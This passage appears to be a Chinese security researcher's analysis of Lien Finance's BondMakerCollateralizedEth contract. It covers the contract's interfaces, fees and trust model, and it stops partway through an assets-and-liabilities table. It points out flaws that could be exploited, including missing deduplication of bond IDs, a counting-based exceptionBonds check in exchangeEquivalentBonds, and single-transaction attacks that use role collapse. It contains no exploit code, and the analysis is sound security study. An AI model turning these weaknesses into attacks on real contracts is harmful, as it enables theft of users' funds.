| `FEE_TAKER`                | `address`                          | 手续费接收地址（immutable）                         |
| `DECIMALS_OF_BOND`         | `uint8`                            | 债券精度（immutable，本例 = 8）                     |
| `DECIMALS_OF_ORACLE_PRICE` | `uint8`                            | 预言机价格精度（immutable，本例 = 8）               |
| `MATURITY_SCALE`           | `uint256`                          | 到期日步长（immutable，maturity 必须是其倍数）      |

##### 抵押品：ETH

`BondMakerCollateralizedEth` 的 `_collateralAddress()` 固定返回 `address(0)`（代表原生 ETH），`_getCollateralDecimals()` 返回 18。所有抵押品操作（存入、赎回、清算）均以 ETH 收发，不涉及 ERC20。

> 存入抵押品不需要 approve —— 调用 `issueNewBonds` 时直接附带 `msg.value`。

##### 手续费模型

整体是 **0.2%** 的费率，收款地址 `FEE_TAKER`。但三处的**记账方式完全不同**，只有铸造是"少给你债券"，另外两处才是真正把 ETH 转出去：

| 操作                                         | 费率公式                            | 这笔 fee 实际发生了什么                                      | 抵押品池净变化               |
| -------------------------------------------- | ----------------------------------- | ------------------------------------------------------------ | ---------------------------- |
| 铸造债券（`issueNewBonds`）                  | `fee = ceil(msg.value × 2 / 1002)`  | **不转账**。只是把铸造量按 `msg.value − fee` 折算，少铸给你这部分债券。这笔 ETH 留在池子里 | `+ msg.value`（全额）        |
| 赎回抵押品（`reverseBondGroupToCollateral`） | `fee = collateralAmount × 2 / 1000` | 两次 `_sendCollateralTo`：先给 FEE_TAKER `fee`，**再给用户全额** `collateralAmount` | `− collateralAmount × 1.002` |
| 到期清算（`liquidateBond`）                  | `fee = totalPayment × 2 / 1000`     | 各 bond token 合约先收到全额 `totalPayment`，之后 FEE_TAKER 再**额外**收 `fee` | `− totalPayment × 1.002`     |

> 三者合起来是自洽的：存入 `V` 只铸出 `≈ V/1.002` 份债券，池子却收下了全部 `V`，多出来的 0.2% 就是留给日后 reverse / liquidate 时支付 FEE_TAKER 的准备金。赎回同样数量的债券会带走 `V/1.002 × 1.002 = V`，池子恰好归零。
>
> 也就是说：**「铸造时扣了手续费」是一种记账上的说法，那一刻并没有任何 ETH 离开合约**。`_issueNewBonds` 里没有 `_sendCollateralTo(FEE_TAKER, ...)`。

##### Bond 的存储结构

每只债券在 `_bonds` 中存储为 `BondInfo`：

| 字段               | 含义                                                         |
| ------------------ | ------------------------------------------------------------ |
| `maturity`         | 到期日（Unix 时间戳）                                        |
| `contractInstance` | 债券 ERC20 代币合约（`BondTokenInterface`）                  |
| `strikePrice`      | **纯 SBT 标记位**：`_getSbtStrikePrice(polyline)` 的返回值。只有折线恰好是 2 段、且每段 `right.y` 都等于 `polyline[0].right.x` 时才非 0；其余三种形状一律为 0 |
| `fnMapID`          | payoff 函数的 keccak256 哈希                                 |

##### BondGroup 的约束

`registerNewBondGroup` 的三条硬性要求：

1. `bondIDs.length >= 2`；
2. 组内每只债券的 `maturity` 必须等于传入的 `maturity`；
3. **除 `bondIDs[0]` 之外，其余每只债券的 `strikePrice` 必须为 0**（报错信息 `"except the first bond must not be pure SBT"`）。结合上面对 `strikePrice` 的说明，这等价于：**一个 BondGroup 里最多只能有一只 PURE_SBT，且必须排在第 0 位**。

加上 `_assertBondGroup` 做的"抵押品足额"校验。这项校验的精确语义是：

- **采样点集合**：遍历组内每只债券的每条线段，收集所有 `segments[j].right.x`（即各线段的**右端点** x 坐标）并去重。注意左端点 `x = 0` 不在收集范围内；但 `rateBreakPoints` 数组按"线段总数"分配、只填了去重后的部分，**未填充的尾部保持为 0**，所以 `rate = 0` 实际上也会被一并校验一次。
- **校验内容**：对每个采样点 `rate`，用精确分数（`totalBondPriceN / totalBondPriceD`）累加组内所有债券在该 x 处的 payoff，要求 `totalBondPriceN == totalBondPriceD × rate`，即**payoff 总和恰好等于标的价**。
- **未覆盖的区域**：最大采样点**右侧到无穷**的区间不在采样集合内。该区间上每只债券的取值由其最后一条线段延伸决定，而 `assertPolyline` 只保证**单只债券**的最后一段斜率落在 `[0, 1]`，并未对"组内各债券最后一段斜率之和"施加任何约束。

含义：1 ETH 抵押品铸造出的一组债券，在这些采样点上的 payoff 总和 = ETH 的 USD 价格。

##### Bond ID 与 fnMap ID 的生成

- `bondID = keccak256(abi.encodePacked(address(this), maturity, fnMap))` —— 同一 BondMaker 上同到期日 + 同 payoff **编码**的债券共用 bondID。
- `fnMapID = keccak256(fnMap)` —— 同一 payoff 折线编码的哈希，可跨 BondMaker 复用。
- 两个 ID 都可以不上链预计算（`generateBondID` 和 `generateFnMapID` 均为 `view`）。

> 源码注释明确指出：`"Cannot detect if the bond is described in a different polyline while two are mathematically equivalent."` 即**数学上等价但编码不同的折线会得到不同的 bondID / fnMapID**，合约不做规范化。

##### 债券生命周期

```
registerNewBond → registerNewBondGroup → issueNewBonds（存 ETH 铸币）
                                                    ↓
                                          持有 bond token
                                                    ↓
                         ┌──────────────────────────┼──────────────────────────┐
                         ↓                          ↓                          ↓
              reverseBondGroupToCollateral   exchangeEquivalentBonds    liquidateBond
              （提前赎回 ETH）               （等价互换债券）            （到期清算 ETH）
```

##### 总结

| 维度      | 说明                                                         |
| --------- | ------------------------------------------------------------ |
| 合约名称  | BondMakerCollateralizedEth                                   |
| 抵押品    | ETH（原生），`address(0)` + 18 decimals，**全局单池、不按 BondGroup 分账** |
| 手续费    | 0.2%，发送到 FEE_TAKER；issue 是内扣，reverse / liquidate 是池子额外支出 |
| 债券结构  | BondInfo：maturity + bondToken + strikePrice + fnMapID       |
| BondGroup | ≥2 只债券；到期日一致；最多一只 PURE_SBT 且须在第 0 位；payoff 总和在采样点上 = 标的价 |
| Bond ID   | `keccak256(abi.encodePacked(合约地址, maturity, fnMap))`     |
| 精度      | Bond 8 dec，Oracle 8 dec（构造函数硬编码传入 `8, 8`）        |


### 对外接口

#### 状态改变函数

##### registerNewBond —— 注册新债券类型

```
function registerNewBond(uint256 maturity, bytes calldata fnMap)
    external
    returns (bytes32 bondID, address bondTokenAddress, bytes32 fnMapID);
```

函数作用：铸造一个新的 ERC20 债券代币合约，并将债券信息存入 `_bonds`。

参数含义：
- `maturity`：到期日（Unix 时间戳）。
- `fnMap`：payoff 折线的原始编码（字节）。

返回值：
- `bondID`：由 `keccak256(abi.encodePacked(address(this), maturity, fnMap))` 确定性生成的债券 ID。
- `bondTokenAddress`：新部署的债券 ERC20 代币合约地址。
- `fnMapID`：`keccak256(fnMap)`。

条件限制：
- `maturity > block.timestamp`，且 `maturity < block.timestamp + 365 days`。
- `maturity % MATURITY_SCALE == 0`。
- 同一 bondID 不能重复注册（判据是 `_bonds[bondID].contractInstance == address(0)`）。
- **fnMap 的折线校验只在 `fnMapID` 首次出现时执行**：若 `_registeredFnMap[fnMapID].length == 0`，才走 `decodePolyline` → `assertPolyline` → `_isBondWorthless` 这条路径；若该 fnMapID 已被注册过，直接复用已存的折线，**跳过全部校验**。
- `assertPolyline` 的具体约束：
  - 第 0 段左端点必须是 `(0, 0)`；
  - 每段 `left.x < right.x`；
  - 相邻段首尾坐标必须重合（x 和 y 都要连续）；
  - 相邻两段**斜率不得相同**（`nextNum × curDen != nextDen × curNum`）；
  - **最后一段斜率必须满足 `0 ≤ 斜率 ≤ 1`**。
- `_isBondWorthless`：折线不能所有段的 `right.y` 都为 0。
- `_getSbtStrikePrice` 的结果写入 `BondInfo.strikePrice`（非 PURE_SBT 形状为 0），此步骤不会 revert。

##### registerNewBondGroup —— 创建债券组

```
function registerNewBondGroup(bytes32[] calldata bondIDs, uint256 maturity)
    external
    returns (uint256 bondGroupID);
```

函数作用：将多只债券打包为一组，共享到期日。之后`issueNewBonds`按组铸造。

参数含义：
- `bondIDs`：要打包的债券 ID 数组。
- `maturity`：到期日。

返回值：
- `bondGroupID`：从 1 开始自增的组 ID。

条件限制（`_assertBondGroup` + 本函数内的额外检查）：
- `bondIDs` 至少包含 2 只债券。
- 所有债券的 `maturity` 必须与参数一致。
- **除 `bondIDs[0]` 外，其余每只债券的 `strikePrice` 必须为 0**（`"except the first bond must not be pure SBT"`）——即组内最多一只 PURE_SBT，且必须排第 0 位。
- 在**采样点集合**上，BondGroup 的 payoff 总和必须等于标的价（保证 1:1 抵押）。采样点 = 组内所有线段的 `right.x` 去重，外加数组未填充部分留下的 `rate = 0`。
- 每个采样点必须能在每只债券的折线中找到对应线段（`_correspondSegment` 返回 `ok`），否则 revert `"invalid domain expression"`。

> **不做的检查**：`bondIDs` 数组**不去重**——同一个 bondID 可以在一个 BondGroup 中出现多次；`_assertBondGroup` 会把它的 payoff 重复计入总和。
>
> **不覆盖的区域**：最大采样点右侧到无穷的区间不在校验范围内（详见上文「BondGroup 的约束」）。



##### issueNewBonds —— 存入 ETH 铸造债券

```
function issueNewBonds(uint256 bondGroupID)
    external
    payable
    returns (uint256 bondAmount);
```

函数作用：附带 ETH 铸造 BondGroup 中每只债券的等量 token。ETH 即为抵押品。

参数含义：
- `bondGroupID`：目标债券组 ID。
- `msg.value`：存入的 ETH 数量。

返回值：
- `bondAmount`：实际铸造的债券数量（精度 8）。

条件限制：
- BondGroup 必须存在（`bondGroupID < _nextBondGroupID`）且 `bondIDs` 非空、未到期。
- 内部先扣 0.2% 手续费：`fee = ceil(msg.value × 2 / 1002)`。
- `bondAmount = _applyDecimalGap(msg.value − fee, 18, 8)`，必须 `!= 0`。
- 向 `msg.sender` 铸造组内**每一只**债券各 `bondAmount` 份。

> ⚠️ **此处不发生任何转账**：`_issueNewBonds` 只是从 `msg.value` 中扣掉 `fee` 再算铸造量，代码里**没有** `_sendCollateralTo(FEE_TAKER, fee)`。全部 `msg.value` 都留在合约里，多出来的 0.2% 成为准备金。源码注释也这么说：`"The fee send to Lien token contract when liquidateBond() or reverseBondGroupToCollateral()"`。



##### reverseBondGroupToCollateral —— 提前赎回 ETH

```
function reverseBondGroupToCollateral(uint256 bondGroupID, uint256 bondAmount)
    external
    returns (bool success);
```

函数作用：销毁债券 token，换回抵押品 ETH（需在到期日前）。

参数含义：
- `bondGroupID`：目标债券组 ID。
- `bondAmount`：要销毁的债券数量（精度 8）。

返回值：固定返回 `true`。

条件限制：
- `bondAmount` 不能为 0。
- BondGroup 必须存在、`bondIDs` 非空、未到期。
- 销毁 BondGroup 中每只债券的 `bondAmount` 份（`simpleBurn`，余额不足会返回 false → revert `"failed to burn bond token"`）。
- `collateralAmount = _applyDecimalGap(bondAmount, 8, 18)`。
- 先向 FEE_TAKER 转 `fee = collateralAmount × 2 / 1000`，**再向 msg.sender 转全额 `collateralAmount`**。合约实际支出 `collateralAmount × 1.002`。
- 两次转账都要求合约 ETH 余额充足（`_transferETH` 内的 `_hasSufficientBalance`）。

> 注意用户拿到的是**全额** `collateralAmount`，手续费不是从他这里扣的，而是池子额外付的（见上文「手续费模型」）。



##### liquidateBond —— 到期清算

```
function liquidateBond(uint256 bondGroupID, uint256 oracleHintID)
    external
    returns (uint256 totalPayment);
```

函数作用：到期后按预言机价格计算 payoff，从抵押品池中以 ETH 支付到各债券 token 合约。

参数含义：
- `bondGroupID`：目标债券组 ID。
- `oracleHintID`：预言机数据 ID 提示，**仅用于省 gas，不影响结算价**。传 0 或 `> latestId` 则回退为 `latestId`。

返回值：
- `totalPayment`：实际支付的 ETH 总量（精度 18）。

条件限制：
- 必须已到期（`block.timestamp >= maturity`）。
- 预言机 `latestId` 不能为 0。
- 结算价 `price != 0` 且 `price < 2^64`。
- 遍历 BondGroup 中每只债券，按 fnMap + 到期日价格计算 payoff，ETH 发送到各债券 token 合约。
- 如果 `totalPayment != 0`，**额外**向 FEE_TAKER 支付 `totalPayment × 2 / 1000`。

**结算价是怎么定的**（`_getPriceOn`）：

```solidity
require(_oracleContract.getTimestamp(hintID) > timestamp, "there is no price data after maturity");
uint256 id = hintID - 1;
while (id != 0) { if (_oracleContract.getTimestamp(id) <= timestamp) break; id--; }
return _oracleContract.getPrice(id + 1);
```

即：从 `hintID` 向前回溯，找到**到期时刻之后的第一条**预言机记录。因此不管传什么合法的 `hintID`，结果都是同一条记录——**调用者无法通过 `oracleHintID` 影响结算价**，只能影响循环次数（gas）。传入的 hint 若其时间戳不晚于 maturity，则直接 revert。

**每只债券只结算一次**：`_sendCollateralToBondTokenContract` 调用 `bondTokenContract.expire(n, d)`，只有返回 `isFirstTime == true` 时才真正转出抵押品。若同一 bondID 被多个 BondGroup 包含，第二次 `liquidateBond` 对该债券支付 0。

注意：ETH 发送到债券 token 合约，而非直接给持有者。持有者需自行调用该 bond token 的 `burn(amount)` / `burnAll()` 领取。



##### exchangeEquivalentBonds —— 等价债券互换

```
function exchangeEquivalentBonds(
    uint256 inputBondGroupID,
    uint256 outputBondGroupID,
    uint256 amount,
    bytes32[] calldata exceptionBonds
) external returns (bool success);
```

函数作用：销毁 input 组的债券，铸造等量 output 组的债券。

参数含义：
- `inputBondGroupID`：要销毁的债券组 ID。
- `outputBondGroupID`：要铸造的债券组 ID。
- `amount`：互换数量（精度 8）。
- `exceptionBonds`：不想参与互换的债券 ID 列表。

返回值：固定返回 `true`。

条件限制：
- 两组 BondGroup 都必须存在、`bondIDs` 非空。
- 两组的到期日必须相同（`inputMaturity == outputMaturity`），且未到期。
- 非 exception 债券：先遍历 input 组全部销毁 `amount` 份，再遍历 output 组全部铸造 `amount` 份。
- exceptionBonds 的"两边都包含"约束——**实现方式是计数，不是集合比较**（见下）。

**exceptionCount 的实际算法**：

```solidity
uint256 exceptionCount;                      // 初值 0
for (i in inputIDs)                          // 第一轮：input
    for (j in exceptionBonds)
        if (exceptionBonds[j] == inputIDs[i]) { flag = false; exceptionCount += 1; }
    if (flag) _burnBond(inputIDs[i], msg.sender, amount);

require(exceptionBonds.length == exceptionCount, "All the exceptionBonds need to be included in input");

for (i in outputIDs)                         // 第二轮：output
    for (j in exceptionBonds)
        if (exceptionBonds[j] == outputIDs[i]) { flag = false; exceptionCount -= 1; }
    if (flag) _mintBond(outputIDs[i], msg.sender, amount);

require(exceptionCount == 0, "All the exceptionBonds need to be included both in input and output");
```

需要如实记录的几点：

- 这是一个**双重循环的匹配计数**：`exceptionCount` 统计的是"(inputIDs × exceptionBonds) 笛卡尔积中相等的对数"，而不是"有多少个 exceptionBond 出现在 input 中"。
- 第一个 `require` 判的是 `exceptionBonds.length == exceptionCount`，即**数量相等**，不是集合包含。
- 第二个 `require` 判的是同一个计数器在 output 侧被减回 0，同样是数量相等。
- 前面已述：`registerNewBondGroup` **不对 `bondIDs` 去重**，且 `exceptionBonds` 由调用者自由传入、**也不去重**。因此上述两个等式与"集合包含"在有重复元素时并不等价。
- `flag` 是在两层循环外声明的函数级变量，内层循环命中后不 `break`，会对同一个 `inputIDs[i]` 继续匹配 `exceptionBonds` 中的其余元素。



##### receive —— 接收 ETH

```
receive() external payable;
```

与 GeneralizedDotc 不同，BondMaker 的 `receive()` 不追踪记账余额——ETH 直接进入合约的抵押品池。铸造债券应使用 `issueNewBonds` 而非直接转账。



#### 只读函数

##### collateralAddress —— 抵押品地址

```
function collateralAddress() external view returns (address);
```

对于 `BondMakerCollateralizedEth`，固定返回 `address(0)`（代表 ETH）。



##### oracleAddress —— 预言机地址

```
function oracleAddress() external view returns (address);
```

返回构造函数中设定的价格预言机地址（immutable）。



##### feeTaker —— 手续费接收地址

```
function feeTaker() external view returns (address);
```

返回构造函数中设定的手续费接收地址（immutable）。



##### decimalsOfBond —— 债券精度

```
function decimalsOfBond() external view returns (uint8);
```

返回债券精度（本例 = 8）。



##### decimalsOfOraclePrice —— 预言机价格精度

```
function decimalsOfOraclePrice() external view returns (uint8);
```

返回预言机价格精度（本例 = 8）。



##### maturityScale —— 到期日步长

```
function maturityScale() external view returns (uint256);
```

到期日必须为该值的整数倍。



##### nextBondGroupID —— 下一个 BondGroup ID

```
function nextBondGroupID() external view returns (uint256);
```

返回下一个可用的 bondGroupID（当前已有的最大 ID + 1）。



##### getBond —— 查询债券信息

```
function getBond(bytes32 bondID)
    external
    view
    returns (
        address bondTokenAddress,
        uint256 maturity,
        uint64 solidStrikePrice,
        bytes32 fnMapID
    );
```

返回债券的四要素。无 revert 条件（查询不存在的 bondID 返回全 0）。



##### getFnMap —— 查询 payoff 折线

```
function getFnMap(bytes32 fnMapID) external view returns (bytes memory fnMap);
```

将 `_registeredFnMap[fnMapID]` 中的折线编码为 abi 格式返回。无 revert 条件。



##### getBondGroup —— 查询债券组

```
function getBondGroup(uint256 bondGroupID)
    external
    view
    returns (bytes32[] memory bondIDs, uint256 maturity);
```

返回债券组的 bondID 数组和到期日。

条件限制：`bondGroupID` 必须 < `_nextBondGroupID`（即必须已创建），否则 revert。



##### generateFnMapID —— 计算 fnMap ID

```
function generateFnMapID(bytes memory fnMap) external view returns (bytes32 fnMapID);
```

返回 `keccak256(fnMap)`。不上链即可算出。



##### generateBondID —— 计算 Bond ID

```
function generateBondID(uint256 maturity, bytes memory fnMap) external view returns (bytes32 bondID);
```

返回 `keccak256(abi.encodePacked(address(this), maturity, fnMap))`。不上链即可算出。

### 使用手册

#### 一级市场：发行人

##### 工作流一：发行新债券类型

调用 `registerNewBond(maturity, fnMap)` → 返回 `(bondID, bondTokenAddress, fnMapID)`。

这一步会部署一个全新的 ERC20 代币来代表这种债券。条件限制：

- `maturity` 必须是未来时间，且不能超过当前时间 + 365 天。
- `maturity` 必须是 `MATURITY_SCALE` 的整数倍。
- 同一 `maturity + fnMap` 组合只能注册一次。
- fnMap 折线必须合法（有效的 polyline，不能是"任何价格下 payoff 都为 0"的无价值债券）。
- **折线校验只在该 fnMap 首次出现时执行**；若 `fnMapID` 已被别的债券注册过，直接复用已存折线并跳过全部校验。

##### 工作流二：创建债券组

调用 `registerNewBondGroup(bondIDs, maturity)` → 返回 `bondGroupID`。

条件限制：

- `bondIDs` 至少包含 2 只债券（**不去重**）。
- 所有债券的 `maturity` 必须一致。
- 除 `bondIDs[0]` 外，其余债券的 `strikePrice` 必须为 0 —— 即组内最多一只 PURE_SBT，且必须排在第 0 位。
- 在**采样点**（组内所有线段的 `right.x` 去重，另含 `rate = 0`）上，债券组的 payoff 总和必须等于标的价。最大采样点右侧的区间不在校验范围内。

##### 工作流三：铸造债券（存入 ETH 换 bond token）

调用 `issueNewBonds(bondGroupID)`，**附带 ETH（`msg.value`）**。

- 抵押品就是 ETH，通过 `msg.value` 直接传入，不需要事先 approve。
- 内部按 `fee = ceil(msg.value × 2 / 1002)` 折减铸造量，但**这一刻没有任何 ETH 转出**，全部 `msg.value` 都留在合约里。
- 按 `msg.value − fee`（精度 18）换算为 bond 数量（精度 8），对 BondGroup 中的每只债券铸造等量 bond token 给你。
- 铸造的 bond 数量不能为 0。

##### 工作流四：提前赎回抵押品（不等到期）

调用 `reverseBondGroupToCollateral(bondGroupID, bondAmount)`。

- 必须在到期日前调用。
- 销毁你持有的 `bondAmount` 份 BondGroup 中每只债券（任一只余额不足即整笔回滚）。
- 你拿到**全额** ETH（`_applyDecimalGap(bondAmount, 8, 18)`）；FEE_TAKER **额外**从池子里拿走 0.2%。合约本次共支出 100.2%。

##### 工作流五：到期清算

到期日后调用 `liquidateBond(bondGroupID, oracleHintID)` → 返回 `totalPayment`。

- 必须在到期日后调用（`block.timestamp >= maturity`）。
- 结算价 = 预言机中**到期时刻之后的第一条**记录。`oracleHintID` 只是回溯循环的起点，**只省 gas、不改结果**；传 0 或超出 `latestId` 时回退为 `latestId`。
- 预言机价格不能为 0 且必须 `< 2^64`。
- 遍历 BondGroup 中的每只债券，按 fnMap + 结算价计算 payoff，从抵押品池中以 ETH 发送到各债券 token 合约。每只债券靠 `expire()` 的 `isFirstTime` 保证**只被结算一次**。
- 如果 `totalPayment != 0`，FEE_TAKER **额外**收取 `totalPayment × 2 / 1000`。

注意：`liquidateBond` 是把 ETH 发送到债券 token 合约，不是直接给债券持有者。持有者需要再调用该 bond token 的 `burn` / `burnAll` 赎回。

##### 工作流六：等价债券互换

调用 `exchangeEquivalentBonds(inputBondGroupID, outputBondGroupID, amount, exceptionBonds)`。

- 两个 BondGroup 的到期日必须相同，且都未到期。
- 销毁 `amount` 份 `inputBondGroupID` 中的债券，铸造等量 `outputBondGroupID` 中的债券。
- `exceptionBonds`：不想参与互换的债券 ID 列表。这些债券在输入组中不被销毁，在输出组中不被铸造。
- 合约对 exceptionBonds 的约束是**匹配计数**（`exceptionBonds.length == exceptionCount`，然后在 output 侧减回 0），而不是集合包含判断；`bondIDs` 与 `exceptionBonds` 均不去重。详见上文接口章节的算法引用。







## 权限 / 职责 / 信任模型

> 前提假设：官方（部署者）没有恶意。以下分析基于此假设展开。



在 Lien Finance 系统中（包含 [BondMakerCollateralizedEth.sol](file:///Users/z/Documents/web3/06_realcase/04_LienFinanceAttackAnalysis/0xda6fc5625e617bb92f5359921d43321cebc6bef0/BondMakerCollateralizedEth.sol) 与 [GeneralizedDotc.sol](file:///Users/z/Documents/web3/06_realcase/04_LienFinanceAttackAnalysis/0x656e5e976d523a427f05b0c212a22a89ccd9ef18/GeneralizedDotc.sol)），系统的所有参与者/主体（Actors）及其可执行操作与身份限制如下表所示：

### 一、 系统参与者与权限限制表

| Actor (参与者/主体)                                      | Can call / do (可执行的操作 / 调用的接口)                    | Any restriction on who this can be? (身份是否有实际限制)     |
| :------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **Bond Issuer / Anyone**<br/>(债券发行人 / 一级市场用户) | • `registerNewBond`: 注册新债券并部署 `BondToken`。<br/>• `registerNewBondGroup`: 打包债券组。<br/>• `issueNewBonds` (payable): 存 ETH 抵押品铸造 BondGroup 组内所有债券。<br/>• `reverseBondGroupToCollateral`: 到期前销毁债券赎回 ETH。<br/>• `exchangeEquivalentBonds`: 在同到期日 BondGroup 间等价互换债券。<br/>• `liquidateBond`: 到期后按预言机价格触发清算，向各 `BondToken` 合约划拨 ETH。 | **无限制（Permissionless / 任意地址）**<br/>任何外部账户（EOA）或合约均可无门槛调用一级市场所有发行、组装、铸造、互换与清算接口。 |
| **OTC Pool Seller**<br/>(二级市场卖家 / 挂单方)          | • `createVsErc20Pool` / `createVsEthPool` / `createVsBondPool`: 创建 OTC 挂单池，可任意指定定价器、预言机、买方 BondMaker 及费率 `feeBaseE4`。<br/>• `updateVsErc20Pool` / `updateVsEthPool` / `updateVsBondPool`: 更新挂单池参数。<br/>• `deleteVsErc20Pool` / `deleteVsEthPool` / `deleteVsBondPool`: 删除挂单池。<br/>• `depositEth` / `withdrawEth`: 存取用于 Buy-Bond-Pay-ETH 方向的 ETH 资金。 | **创建池：无限制（任意地址）**<br/>**更新/删除池：受限 (`msg.sender == pool.seller`)**<br/>仅限该 Pool 的创建者地址可进行更新或删除操作。 |
| **OTC Buyer / Taker**<br/>(二级市场买家 / OTC 吃单方)    | • `exchangeErc20ToBond` / `exchangeEthToBond`: 支付 ERC20 或 ETH 购买卖家债券。<br/>• `exchangeBondToErc20` / `exchangeBondToEth`: 支付债券向卖家换取 ERC20 或 ETH。<br/>• `exchangeBondToBond`: 支付买方 BondMaker 的债券篮子购买卖家债券。<br/>• `depositEth` / `withdrawEth`: 存入或提取 ETH 记账余额。<br/>• `calcRateBondTo*` / `totalBondAllowance`: 查询汇率与估值。 | **无限制（Permissionless / 任意地址）**<br/>只要持有相应资产并给予 `approve` 授权，任何地址都可以与现存的 Pool 发生交易。 |
| **Bond Token Holder**<br/>(债券代币持有者)               | • 标准 ERC20 转账与授权操作（`transfer`, `approve`, `transferFrom`）。<br/>• `burn(amount)` / `burnAll()`: 到期清算后销毁手中的 `BondToken` 提取分派到该 Token 合约的 ETH 收益（payoff）。 | **无限制（任意代币持有者）**<br/>任何持有 `BondToken` 的地址均可执行。 |
| **BondMaker Contract**<br/>(BondToken 合约的管理方)      | • 调用于每个 `BondToken` 合约的 `mint`（铸造债券）。<br/>• 调用于 `BondToken` 的 `simpleBurn`（销毁债券）。<br/>• 调用于 `BondToken` 的 `expire`（设置到期结算比例）。 | **严格受限：必须是部署该 `BondToken` 的 `BondMakerCollateralizedEth` 合约**<br/>`BondToken` 继承自 `Ownable`，其 `owner` 固定为 `BondMaker` 合约地址。外部普通用户无法直接调用 `BondToken` 的 `mint`/`simpleBurn`/`expire`。 |
| **Fee Taker**<br/>(协议手续费接收地址)                   | • 被动接收 ETH 手续费转账：在 `reverseBondGroupToCollateral`（提前赎回）和 `liquidateBond`（到期清算）时接收 0.2% 的 ETH 手续费。 | **严格受限：不可变地址（Immutable）**<br/>在 `BondMakerCollateralizedEth` 构造函数中固定的 `FEE_TAKER` 地址，部署后无法修改。 |
| **Price / Volatility Oracle**<br/>(价格与波动率预言机)   | • 被 `BondMaker` 与 `GeneralizedDotc` 调用，提供价格与波动率数据。 | **全局预言机：受限（不可变地址）**<br/>`BondMaker` 和 `GeneralizedDotc` 的主预言机在构造函数中写死。<br/>**Pool 级预言机：无限制**<br/>Pool 卖家创建池时指定的预言机可为卖家传入的任意地址。 |
| **Bond Pricer**<br/>(债券 Black-Scholes 定价器)          | • 被 `GeneralizedDotc` 调用，计算债券理论价格与杠杆率。      | **无限制（由 Pool 卖家指定）**<br/>`GeneralizedDotc` 不限制 Pricer 合约的来源，由挂单卖家在 `createVs*Pool` 时自由指定。 |
| **Deployer / Admin**<br/>(合约部署者)                    | • 在部署 `BondMakerCollateralizedEth` 与 `GeneralizedDotc` 时传入初始参数。 | **仅限部署时刻**<br/>部署完成后，系统**无任何 Owner / Admin 特权角色，无 Pause 暂停开关，无 Proxy 可升级代理**。 |



### 二、 核心信任模型总结

**【综合结论】**  
在 Lien Finance 协议的所有改变状态（State-Changing）入口点中：

1. **仅有池子更新/删除**（`msg.sender == pool.seller`）和**内部代币底层铸销**（`BondToken.mint`/`simpleBurn`/`expire`，仅限 `BondMaker` 合约自身）存在身份权限限制；
2. **其他所有操作**——包括注册新债券、打包债券组、存抵押品发币、等价债券互换、到期清算、反向赎回、创建挂单池以及所有吃单交易——**对任何地址完全开放（100% Permissionless）**。

整个系统的安全性和资金守恒完全依赖于**数学/算法校验**（如 `assertPolyline`、`_assertBondGroup`、`exchangeEquivalentBonds` 中的 exceptionBonds 逻辑），而不依赖任何身份信任、KYC 或特权管理员。



### 三、 角色合并现象与隐式假设分析（Role-Collapse & Implicit Assumptions）

**【角色合并（Role-Collapse）说明】**  
上表中将“债券发行人（Issuer）”、“池子卖家（Seller）”与“OTC 买家（Buyer）”分为不同行，**仅代表业务行为上的逻辑分类，而非合约层面的身份隔离**。

 1. **单地址合并**：链上合约没有任何机制阻止同一个 EOA 或攻击合约在**单笔交易（Single Transaction）**中同时扮演发行人、卖家和买家（例如：同一笔交易内完成“注册债券 → 凭空铸币 → 挂单/吃单套现”）。
2. **隐式假设的失效**：传统金融或 DeFi 协议设计时，常常隐式假设这些角色由**独立的、自利且互相制衡的市场主体**承担（例如假设买家会审查卖家的债券真实性与抵押率，或者假设发行人与交易对手利益对立）。
3. **安全风险**：一旦协议中的关键计算或等式校验（如 `exchangeEquivalentBonds`）存在瑕疵，单个参与者就可以通过“角色合并”，在无需与任何真实外部对手方博弈的情况下，直接在单笔交易内利用协议自身的漏洞完成闭环攻击。



以下是根据 [BondMakerCollateralizedEth.sol](file:///Users/z/Documents/web3/06_realcase/04_LienFinanceAttackAnalysis/0xda6fc5625e617bb92f5359921d43321cebc6bef0/BondMakerCollateralizedEth.sol)、[GeneralizedDotc.sol](file:///Users/z/Documents/web3/06_realcase/04_LienFinanceAttackAnalysis/0x656e5e976d523a427f05b0c212a22a89ccd9ef18/GeneralizedDotc.sol) 源码及 [LienFinanceAttackAnalysis.md](file:///Users/z/Documents/web3/06_realcase/04_LienFinanceAttackAnalysis/LienFinanceAttackAnalysis.md) 梳理的 Lien Finance 资产与负债两列表格：



## Lien Finance 资产与负债

下面的数据全部是在 **25599301** 高度



### 资产与负债对照表

| 资产（Assets: ETH/代币在链上的实际存储位置）                 | 负债（Liabilities: 对该资产池可能提出的所有合法索赔/债务）   |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| **1. BondMaker 抵押品池 ETH 余额**<br/>• **实际位置**：`address(BondMakerCollateralizedEth).balance`<br/>• **机制**：全局单池原生 ETH，所有 `BondGroup` 共享，合约底层**无子账本映射**。<br/>• **当前具体数值**：<br />BondMakerCollateralizedEth(0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0):Balance : 0.000000012000000086 ETH (12000000086 wei) | **1.1 提前赎回 ETH 索赔 (Reverse Bond Group)**<br/>• **索赔依据**：持有未到期 BondGroup 组内所有债券代币的用户，调用 `reverseBondGroupToCollateral` 销毁代币索赔全额 ETH。<br/>• **衍生债务**：每次赎回需由池子额外向 `FEE_TAKER` 支付 0.2% 手续费（池子实际支出索赔额的 100.2%）。<br/><br/>**1.2 到期清算 ETH 划拨债务 (Liquidate Bond Group)**<br/>• **索赔依据**：到期后任意用户调用 `liquidateBond`，按预言机结算价计算 payoff，将 ETH 从池中划拨至各 `BondToken` 合约。<br/>• **衍生债务**：若清算金额 `totalPayment != 0`，需由池子额外向 `FEE_TAKER` 支付 `totalPayment × 0.2%` 手续费。<br/><br/>**1.3 等价互换产生的索赔权转移与潜在超额索赔**<br/>• **索赔依据**：调用 `exchangeEquivalentBonds` 烧掉 Input 组债券并铸造 Output 组债券，将对 Input 组的索赔权转移为对 Output 组的索赔权。 |
